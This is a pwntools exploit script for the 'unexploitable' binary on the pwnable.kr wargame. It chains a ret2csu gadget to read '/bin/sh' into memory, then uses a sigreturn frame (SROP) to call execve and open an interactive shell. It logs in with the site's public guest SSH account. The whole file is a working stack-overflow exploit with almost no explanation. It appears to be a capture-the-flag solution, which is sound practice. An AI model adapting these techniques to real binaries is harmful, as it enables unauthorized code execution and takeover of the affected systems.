from pwn import *
import sys
import time

from pwnlib.rop.rop import ret2dlresolve

context.arch="amd64"
context.os="linux"


binary_name = "unexploitable"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)

context.binary = e

def csu_gadget(func, arg1, arg2, arg3): # we can jump to any function we have a pointer to. we can control rdi, esi (rsi Lower 32bytes), and rdx.
    CSU_call = 0x4005d0

    payload = p64(0) # this doesn't overwrite any register.
    payload += p64(0)
    payload += p64(1)

    payload += p64(func) #r12
    payload += p64(arg1) #r13 -> edi
    payload += p64(arg2) #r14 -> rsi
    payload += p64(arg3) #r15 -> rdx

    payload +=p64(CSU_call)

    return payload

def main():
    if(len(sys.argv) <2):
        print("Need to specify target.")
        exit()
    else:
        if(sys.argv[1] == "remote"):
            s = ssh(user='unexploitable',host='pwnable.kr',port=2222,password='guest') 
            p = s.process(f"./{binary_name}")
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}",aslr=False, gdbscript="b *main")
        else:
            p = process(f"./{binary_name}")

    CSU_set = 0x4005e6
    read_GOT = 0x601000;
    bin_sh_addr = e.bss()
    syscall_addr = 0x400560


    sigFrame1 = SigreturnFrame()

    sigFrame1.rax = 0x3b
    sigFrame1.rdi = bin_sh_addr
    sigFrame1.rsi = 0
    sigFrame1.rdx = 0
    sigFrame1.rcx = 0x41
    sigFrame1.rip = syscall_addr


    payload1 = b"A"*24 + p64(CSU_set) + csu_gadget(read_GOT,0,bin_sh_addr, 0x8) + p64(e.sym['main']) *8 + p64(syscall_addr)+ bytes(sigFrame1)
    sleep(3)
    p.send(payload1)
    sleep(0.5)
    p.send(b"/bin/sh\x00")
    sleep(3)
    p.send(b"A" * 15)
    p.interactive()

main()
